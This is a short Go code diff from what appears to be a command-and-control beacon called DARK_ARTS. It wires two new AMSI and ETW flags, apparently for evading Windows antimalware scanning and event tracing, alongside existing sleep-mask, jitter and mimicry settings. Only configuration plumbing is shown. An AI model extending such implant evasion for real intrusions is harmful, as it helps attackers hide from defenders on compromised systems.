@@ -34,6 +34,8 @@ var (
 	cfgLogFile   string
 	cfgSleepMask string
 	cfgInsecure  string
+	cfgAMSI      string
+	cfgETW       string
 )
 
 func main() {
@@ -64,6 +66,8 @@ func main() {
 	jitter := envFloatOr("DARK_ARTS_JITTER", cfgJitter, 0.2)
 	taskTimeoutSecs := envInt("DARK_ARTS_TASK_TIMEOUT", 30)
 	sleepMask := os.Getenv("DARK_ARTS_SLEEP_MASK") == "true" || cfgSleepMask == "true"
+	amsi := os.Getenv("DARK_ARTS_AMSI") == "true" || cfgAMSI == "true"
+	etw := os.Getenv("DARK_ARTS_ETW") == "true" || cfgETW == "true"
 
 	client := &http.Client{Timeout: time.Duration(taskTimeoutSecs+5) * time.Second}
 	if os.Getenv("DARK_ARTS_INSECURE") == "true" || cfgInsecure == "true" {
@@ -82,6 +86,8 @@ func main() {
 		Mimic:       os.Getenv("DARK_ARTS_MIMIC") == "true",
 		Noise:       os.Getenv("DARK_ARTS_NOISE") == "true",
 		SleepMask:   sleepMask,
+		AMSI:        amsi,
+		ETW:         etw,
 		StatePath:   filepath.Join(envOr("DARK_ARTS_STATE_DIR", "./data/beacon"), "state.json"),
 		Log:         log,
 		HTTP:        client,
